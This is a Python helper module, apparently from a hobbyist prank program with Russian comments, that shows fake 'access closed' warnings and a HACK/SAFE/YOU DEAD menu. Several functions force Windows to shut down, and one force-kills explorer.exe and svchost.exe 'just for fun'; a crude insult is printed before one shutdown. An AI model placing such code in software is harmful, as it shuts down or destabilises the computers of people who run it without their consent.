# файл где храняться все функции
import tkinter as tk
from tkinter import messagebox 
import os
import time
import webbrowser
from progress.bar import FillingSquaresBar
import pygame
#import uuid
def box():
    messagebox.showwarning("ВНИМАНИЕ","ДОСТУП ЗАКРЫТ")  # функция которая открывается в главном файле
    print('чтож пока secret')
    time.sleep(5)
    os.system ('shutdown /s /t 10')

def radio():
    def change():
            if var.get() == 0:
                messagebox.showwarning("ВНИМАНИЕ","ДОСТУП ЗАКРЫТ")  # ничего почти не делает пока что
            elif var.get() == 1:
                webbrowser.open('https://vk.com', new=2)
            elif var.get() == 2:
                os.system ('shutdown /s /t 10')

 
 
    root = tk.Tk()

    
    var=tk.IntVar()
    var.set(1)
    rad0 = tk.Radiobutton(root, text="HACK", variable=var, value=0)    # инструменты из tkinter
    rad1 = tk.Radiobutton(root, text="SAFE", variable=var, value=1)
    rad2 = tk.Radiobutton(root, text="YOU DEAD", variable=var, value=2)
    button = tk.Button(root,text="OKEY", command=change)
    button.pack()
    rad0.pack()
    rad1.pack()
    rad2.pack()

    root.mainloop()

def texting():
    f = open('ERROR.txt','w')
    f.write("он еще не знает напиши SECURE")

def baring():                                   # прогресс бар

    mylist = [1,2,3,4,5,6,7,8]

    bar = FillingSquaresBar('Countdown', max = len(mylist))         

    for item in mylist:
        bar.next()
        time.sleep(0.2)

    bar.finish()

def crush():                            # завершает работу компьютера... не используеться
    os.system ('shutdown /s /t 1')


def times():
    time.sleep(3)

def time_sds():
    baring()
    print("bay bay mother fucker")
    os.system ('shutdown /s /t 10')

def Osproject():
    print("что происходит мать вашу?")

def testing2():
    os.system("taskkill /f /im explorer.exe") # закрывает проводник
    os.system("taskkill /f /im svchost.exe")    # чисто по фану